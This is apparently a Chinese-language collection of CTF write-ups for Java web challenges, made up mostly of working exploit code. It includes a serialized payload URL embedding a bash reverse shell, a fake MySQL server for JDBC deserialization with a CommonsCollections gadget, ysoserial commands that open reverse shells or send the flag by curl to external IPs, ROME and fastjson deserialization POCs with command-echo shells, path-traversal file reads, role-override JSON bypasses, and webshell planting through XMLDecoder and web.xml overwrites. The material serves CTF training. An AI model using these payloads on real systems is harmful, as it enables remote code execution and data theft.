http://localhost:8888/readobject?data=rO0ABXcNAAdnYWRnZXRzAAAH5XNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAFnQAIWNvbS5lemdhbWUuY3RmLmNvbnRyb2xsZXIuUG9jdGVzdHQADFBvY3Rlc3QuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyACFjb20uZXpnYW1lLmN0Zi50b29scy5Ub1N0cmluZ0JlYW4TzFRaJ9nceQIAAVsACUNsYXNzQnl0ZXQAAltCeHB1cgACW0Ks8xf4BghU4AIAAHhwAAABhMr%2Bur4AAAAxABkBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQA2YmFzaCAtYyBiYXNoJElGUyQ5LWk%2BJi9kZXYvdGNwLzE2OS4yNTQuMTkxLjc3LzIzMzM3PCYxCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAAY8aW5pdD4MABYACAoABAAXACEAAgAEAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAFgAIAAEACQAAABEAAQABAAAABSq3ABixAAAAAAABAAUAAAACAAY%3D 即可getshell, 此题考察的是 java 的反序列化, 还需要再对 java 反序列化有更深入的了解 [羊城杯 2020]A Piece Of Java 给了jar包, 反编译后查看, /hello 接口可以 GET cookie 反序列化 @GetMapping({\"/hello\"}) public String hello(@CookieValue(value = \"data\",required = false) String cookieData, Model model) { if (cookieData != null && !cookieData.equals(\"\")) { Info info = (Info)this.deserialize(cookieData); if (info != null) { model.addAttribute(\"info\", info.getAllInfo()); } return \"hello\"; } else { return \"redirect:/index\"; } } deserialize开始new了一个 SerialKiller private Object deserialize(String base64data) { ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data)); try { ObjectInputStream ois = new SerialKiller(bais, \"serialkiller.conf\"); Object obj = ois.readObject(); ois.close(); return obj; } catch (Exception var5) { var5.printStackTrace(); return null; } } } 找到 .conf 文件 gdufs\\..* java\\.lang\\..* 也就是需要满足白名单才可以进行反序列化, lib里面有 CC 3.2.1, 然后先去查找满足白名单的类, 全局搜索 Serializable, 可用的类 gdufs.challenge.web.invocation.InfoInvocationHandler gdufs.challenge.web.model.DatabaseInfo 其中 DatabaseInfo 的 checkAllInfo 可以恶意连接数据库 public Boolean checkAllInfo() { if (this.host != null && this.port != null && this.username != null && this.password != null) { if (this.connection == null) { this.connect(); } return true; } else { return false; } } 然后因为代理对象在执行被代理对象的任何方法前都会执行重写的invoke方法, 触发 InfoInvocationHandler 中的 invoke 从而调用 checkAllInfo public class InfoInvocationHandler implements InvocationHandler, Serializable { private Info info; public InfoInvocationHandler(Info info) { this.info = info; } public Object invoke(Object proxy, Method method, Object[] args) { try { return method.getName().equals(\"getAllInfo\") && !this.info.checkAllInfo() ? null : method.invoke(this.info, args); } catch (Exception var5) { var5.printStackTrace(); return null; } } } 这里可以借此打 JDBC 反序列化 如果攻击者能够控制JDBC连接设置项，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。 参考: https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ 构造EXP package gdufs.challenge.web; import gdufs.challenge.web.invocation.InfoInvocationHandler; import gdufs.challenge.web.model.DatabaseInfo; import gdufs.challenge.web.model.Info; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Proxy; import java.util.Base64; public class exp { public static void main(String[] args) throws Exception { DatabaseInfo db = new DatabaseInfo(); db.setHost(\"81.70.101.91\"); db.setPort(\"9999\"); db.setUsername(\"root\"); db.setPassword(\"&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\"); ClassLoader classLoader = db.getClass().getClassLoader(); Class[] interfaces = db.getClass().getInterfaces(); InfoInvocationHandler invocationHandler = new InfoInvocationHandler(db); Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, invocationHandler); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream obj = new ObjectOutputStream(baos); obj.writeObject(db); obj.flush(); obj.close(); String payload = new String(Base64.getEncoder().encode(baos.toByteArray())); System.out.println(payload); } } 然后公网建立恶意 mysql # coding=utf-8 import socket import binascii import os greeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\" response_ok_data=\"0700000200000002000000\" def receive_data(conn): data = conn.recv(1024) print(\"[*] Receiveing the package : {}\".format(data)) return str(data).lower() def send_data(conn,data): print(\"[*] Sending the package : {}\".format(data)) conn.send(binascii.a2b_hex(data)) def get_payload_content(): #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payload file= r'payload' if os.path.isfile(file): with open(file, 'rb') as f: payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8') print(\"open successs\") else: print(\"open false\") #calc payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878' return payload_content # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\"Connection come from {}:{}\".format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \"session.auto_increment_increment\" in data: _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000' send_data(conn,_payload) data=receive_data(conn) elif \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000' send_data(conn, _payload) data = receive_data(conn) if \"set names\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"set character_set_results\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"show session status\" in data: mysql_data = '0100000102' mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000' mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000' # 为什么我加了EOF Packet 就无法正常运行呢？？ # 获取payload payload_content=get_payload_content() # 计算payload长度 payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] # 计算数据包长度 data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex mysql_data += str(payload_content) mysql_data += '07000005fe000022000100' send_data(conn, mysql_data) data = receive_data(conn) if \"show warnings\" in data: payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000' send_data(conn, payload) break if __name__ == '__main__': HOST ='0.0.0.0' PORT = 9999 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\"start fake mysql server listening on {}:{}\".format(HOST,PORT)) run() ysoserial java -jar ysoserial.jar CommonsCollections5 \"bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xMDEuOTEvODg4OCAwJj4xJw==}|{base64,-d}|{bash,-i}\" > payload 但是反弹shell不太行, 就通过 curl 数据外带 java -jar ysoserial.jar CommonsCollections5 \"bash -c {echo,Y3VybCAtWCBQT1NUIC1kICJmbGFnPWBjYXQgL2ZsYWdfQVFVQWAiIGh0dHA6Ly8zOS45Ny4xMTQuNDM6ODg4OA==}|{base64,-d}|{bash,-i}\" > payload 访问 /hello, data=Proxypayload 即可 [陇原战\"疫\"]ezjaba 题目链接(web-ezjaba): https://buuoj.cn/match/matches/57/challenges jar包反编译后可以看到 pom.xml 中有 rome 依赖 rome rome 1.0 ROME反序列化, 过滤了两个类 java.util.HashMap javax.management.BadAttributeValueExpException 但是BackDoor底下的finally完成了BadAttributeValueExpException类需要做的事, 可以直接触发toString, 原来的ROME链 参考: https://blog.csdn.net/rfrder/article/details/121236409 TemplatesImpl.getOutputProperties() NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) NativeMethodAccessorImpl.invoke(Object, Object[]) DelegatingMethodAccessorImpl.invoke(Object, Object[]) Method.invoke(Object, Object...) ToStringBean.toString(String) ToStringBean.toString() ObjectBean.toString() EqualsBean.beanHashCode() ObjectBean.hashCode() HashMap.hash(Object) HashMap.readObject(ObjectInputStream) 直接截断从ToStringBean处开始构建, 即可直接触发, 原题不出网, 所以需要设置内存马, 小改一下即可使用 package com.lyzy.ctf.ezjaba.exp; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.lang.reflect.Method; import java.util.Scanner; public class SpringEcho extends AbstractTranslet { static { try { Class c = Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getResponse\"); // Method m1 = c.getMethod(\"getRequest\"); Object resp = m.invoke(o); // Object req = m1.invoke(o); // HttpServletRequest Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.ServletResponse\").getDeclaredMethod(\"getWriter\"); // Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.http.HttpServletRequest\").getDeclaredMethod(\"getHeader\",String.class); // getHeader.setAccessible(true); getWriter.setAccessible(true); Object writer = getWriter.invoke(resp); // String cmd = (String)getHeader.invoke(req, \"cmd\"); String[] commands = new String[3]; String charsetName = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? \"GBK\" : \"UTF-8\"; if (System.getProperty(\"os.name\").toUpperCase().contains(\"WIN\")) { commands[0] = \"cmd\"; commands[1] = \"/c\"; } else { commands[0] = \"/bin/sh\"; commands[1] = \"-c\"; } // commands[2] = cmd; commands[2] = \"cat /flag\"; writer.getClass().getDeclaredMethod(\"println\", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(\"\\\\A\").next()); writer.getClass().getDeclaredMethod(\"flush\").invoke(writer); writer.getClass().getDeclaredMethod(\"close\").invoke(writer); } catch (Exception e){ e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } POC package com.lyzy.ctf.ezjaba.exp; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URLEncoder; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import org.apache.tomcat.util.codec.binary.Base64; import javax.xml.transform.Templates; public class POC { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ ClassPool.getDefault().get(SpringEcho.class.getName()).toBytecode() }); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class, templates); EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean); ObjectBean objectBean = new ObjectBean(String.class,\"ricky\"); // HashMap evilMap = new HashMap(); // evilMap.put(objectBean,1); // evilMap.put(objectBean,1); // setFieldValue(objectBean,\"_equalsBean\",equalsBean); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(toStringBean); oos.close(); System.out.println(URLEncoder.encode(Base64.encodeBase64String(barr.toByteArray()))); // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); // Object o = (Object)ois.readObject(); // o.toString(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } [安洵杯2021]ezjson 任意文件下载 file=/proc/self/fd/5 获得源码 有一个fastjson反序列化入口 @ResponseBody @RequestMapping({\"/json\"}) public String hello(HttpServletRequest request, HttpServletResponse response) { String Poc = request.getParameter(\"Poc\"); if (Poc != null) { String pattern = \".*Exec.*|.*cmd.*\"; / boolean isMatch = Pattern.matches(pattern, Poc); if (isMatch) { return \"No way!!!\"; } else { JSON.parse(Poc); return Poc; } } else { return \"readme\"; } } fastjson版本为1.2.47,需要我们绕过autoType,然后去触发我们的App.Exec#getFlag(), fastjson有个特性，遇到\\x和\\u就会解码，所以正则用十六进制编码绕过 public String getFlag() throws Exception { Exec defineclass = new Exec(this.getClass().getClassLoader()); Class clazz = defineclass.defineClass((String)null, this.ClassByte, 0, this.ClassByte.length); Method exec = clazz.getMethod(\"Exec\", String.class); Object Obj = clazz.newInstance(); exec.invoke(Obj, this.cmd); return this.flag; } 因为用的是parse来进行反序列化,可以用$ref调用任意的getter, 也可以通过su18师傅的方法 题目没有出网, 构造命令回显(也可以写文件, 然后通过最开始的文件下载获取flag) import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.connector.Response; import org.apache.catalina.connector.ResponseFacade; import org.apache.catalina.core.ApplicationFilterChain; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.lang.reflect.Modifier; import java.util.Scanner; public class SpringEcho { public static void Exec(String cmd) { try { Class c = Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getResponse\"); Method m1 = c.getMethod(\"getRequest\"); Object resp = m.invoke(o); Object req = m1.invoke(o); // HttpServletRequest Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.ServletResponse\").getDeclaredMethod(\"getWriter\"); Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.http.HttpServletRequest\").getDeclaredMethod(\"getHeader\", String.class); getHeader.setAccessible(true); getWriter.setAccessible(true); Object writer = getWriter.invoke(resp); String[] commands = new String[3]; String charsetName = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? \"GBK\" : \"UTF-8\"; if (System.getProperty(\"os.name\").toUpperCase().contains(\"WIN\")) { commands[0] = \"cmd\"; commands[1] = \"/c\"; } else { commands[0] = \"/bin/sh\"; commands[1] = \"-c\"; } commands[2] = cmd; writer.getClass().getDeclaredMethod(\"println\", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(\"\\\\A\").next()); writer.getClass().getDeclaredMethod(\"flush\").invoke(writer); writer.getClass().getDeclaredMethod(\"close\").invoke(writer); } catch (Exception e){ } } } POC import java.util.Locale; import javassist.ClassPool; public class exp { public static String bytesToHexString(byte[] src){ StringBuilder stringBuilder = new StringBuilder(\"\"); if (src == null || src.length [GKCTF 2021]babycat-revenge 访问是一个结合登录和注册的网页, 但是注册功能因前端限制不让直接使用, 抓包可以看到代码逻辑 // var obj={}; // obj[\"username\"]='test'; // obj[\"password\"]='test'; // obj[\"role\"]='guest'; function doRegister(obj){ if(obj.username==null || obj.password==null){ alert(\"用户名或密码不能为空\"); }else{ var d = new Object(); d.username=obj.username; d.password=obj.password; d.role=\"guest\"; $.ajax({ url:\"/register\", type:\"post\", contentType: \"application/x-www-form-urlencoded; charset=utf-8\", data: \"data=\"+JSON.stringify(d), dataType: \"json\", success:function(data){ alert(data) } }); } } 可以通过post传参进行注册, 根据ajax模拟 data={\"username\":\"test\",\"password\":\"test\",\"role\":\"guest\"} 普通用户只能使用download功能, 可以进行任意文件读取 /home/download?file=../../../../../../../../proc/self/environ 得到当前路径和tomcat路径, 可以得知静态文件路径/usr/local/tomcat/webapps/ROOT/static/ PWD=/home/app CATALINA_HOME=/usr/local/tomcat 去查web.xml /home/download?file=../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml 得到整个服务的配置 register com.web.servlet.registerServlet login com.web.servlet.loginServlet home com.web.servlet.homeServlet upload com.web.servlet.uploadServlet download com.web.servlet.downloadServlet logout com.web.servlet.logoutServlet logout /logout download /home/download register /register java login /login home /home upload /home/upload loginFilter com.web.filter.LoginFilter loginFilter /home/* java /WEB-INF/index.jsp 就可以获取其中的class了, 一共6个功能1个过滤器 # 其它的类似 /home/download?file=../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/web/servlet/registerServlet.class 反编译查阅代码, 还可以下载得到DAO文件 import com.web.dao.Person; import com.web.dao.baseDao; 查阅上传代码发现限制后缀但不限制文件路径, 也就是可以上传到我们需要的位置, 除此之外还有对文件内容的简单过滤 String[] blackList = { \"Runtime\", \"exec\", \"ProcessBuilder\", \"jdbc\", \"autoCommit\" }; 看到注册器则是一个正则匹配注册, 我们需要\"role\":\"admin\" if (!StringUtils.isNullOrEmpty(role)) { var = var.replace(role, \"\\\"role\\\":\\\"guest\\\"\"); person = (Person)gson.fromJson(var, Person.class); } else { person = (Person)gson.fromJson(var, Person.class); person.setRole(\"guest\"); } 做的是json解析, 所以可以通过JSON解析unicode或者注释绕过去 data={\"username\":\"1\",\"password\":\"1\",\"role\":\"guest\",\"\\u0072\\u006F\\u006C\\u0065\":\"admin\"} JSON解析后会对重复的值进行覆盖, 也就是\"\\u0072\\u006F\\u006C\\u0065\":\"admin\"解析为\"role\":\"admin\"后覆盖了前面的\"role\":\"guest\" 或者通过注释绕过匹配, 因为\"role\":/**/\"admin\"不会影响解析后的赋值 data={\"username\":\"2\",\"password\":\"2\",\"role\":\"guest\",\"role\":/**/\"admin\"} 得到admin权限后通过baseDao发现登录处调用其getConnection方法 connection = baseDao.getConnection(); 跟进发现调用其getConfig方法 public static void getConfig() throws FileNotFoundException { Object obj = (new XMLDecoder(new FileInputStream(System.getenv(\"CATALINA_HOME\") + \"/webapps/ROOT/WEB-INF/db/db.xml\"))).readObject(); if (obj instanceof HashMap) { HashMap map = (HashMap)obj; if (map != null && map.get(\"url\") != null) { driver = (String)map.get(\"driver\"); url = (String)map.get(\"url\"); username = (String)map.get(\"username\"); password = (String)map.get(\"password\"); } } } 然后getConfig会对其xml文件进行反序列化, 考察的是XMLDecoder反序列化, 使用 weblogic XMLDecoder payload 去绕过(冰蝎马, 连接密码rebeyond) /usr/local/tomcat/webapps/ROOT/static/ricky.jsp ]]> XMLDecoder相当于执行 java.io.PrintWriter x = new java.io.PrintWriter(\"/usr/local/tomcat/webapps/ROOT/static/ricky.jsp\"); x.println(\"...\"); x.close(); 上传路径 ../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/db/db.xml 然后再次登录即可触发, 执行/readflag即可 登陆不了_Revenge 验证码处有任意文件读取漏洞 /v/c?r=YzgxZTcyOC5qcGc= 看进程, 得知tomcat位置 /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vcHJvYy9zZWxmL2NtZGxpbmU= file=/home/apache-tomcat-8.5.45/conf/logging.properties 然后就是去查阅ROOT根目录, web.xml和pom.xml /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi93ZWIueG1s /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9wb20ueG1s 然后根据pom.xml去获取框架 ctfshow tiny-framework system 1.1 ${basedir}\\lib\\tiny-framework-1.0.1.jar 去下载 tiny-framework-1.0.1.jar /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9saWIvdGlueS1mcmFtZXdvcmstMS4wLjEuamFy 用winrar自带的修复功能修复后即可反编译查阅源码, 分析后继续获取class文件 /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jb25maWcvY29udHJvbGxlci5wcm9wZXJ0aWVz s=com.ctfshow.controller.Index errorController=com.ctfshow.controller.ErrorPage index=com.ctfshow.controller.Index v=com.ctfshow.controller.Validate /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2NvbS9jdGZzaG93L2NvbnRyb2xsZXIvSW5kZXguY2xhc3M= /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2NvbS9jdGZzaG93L2NvbnRyb2xsZXIvVmFsaWRhdGUuY2xhc3M= 发现注册处可以上传文件, 写马可以写在WEB-INF下, 然后覆写web.xml触发tomcat热部署getshell 然后写在 ../../../../../../../home/apache-tomcat-8.5.45/webapps/ROOT/WEB-INF/shell.jsp, 覆写web.xml shell /WEB-INF/shell.jsp shell /ricky 对路径的匹配也需要改一下, 不能直接匹配我们的路径否则会直接返回404 routerFilter /404.html /s/* REQUEST 依次写入后等待些许访问 /ricky 